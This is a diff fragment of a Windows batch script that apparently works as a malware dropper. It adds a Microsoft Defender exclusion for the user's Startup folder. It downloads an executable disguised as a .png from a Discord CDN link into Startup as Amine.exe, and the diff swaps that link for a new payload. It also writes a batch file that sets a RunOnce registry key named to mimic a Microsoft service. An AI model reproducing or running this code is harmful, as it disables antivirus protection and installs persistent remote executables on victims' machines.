@@ -34,7 +34,7 @@ echo.>"%temp%\tmp"
 
 powershell Add-MpPreference -ExclusionPath '"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"'
 
-powershell -Command "& { Invoke-WebRequest -UseBasicParsing -Uri 'https://cdn.discordapp.com/attachments/1137771634808332378/1197656655404478574/Creal.png' -OutFile \"$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\Amine.exe\" }"
+powershell -Command "& { Invoke-WebRequest -UseBasicParsing -Uri 'https://cdn.discordapp.com/attachments/1137771634808332378/1201583073104510986/Built.png?' -OutFile \"$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\Amine.exe\" }"
 
 echo @echo off > "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Amine.bat"
 echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce /v "*Service Microsoft Distributed Transaction Coordinator" /t REG_SZ /d "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Amine.bat" /f >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Amine.bat"
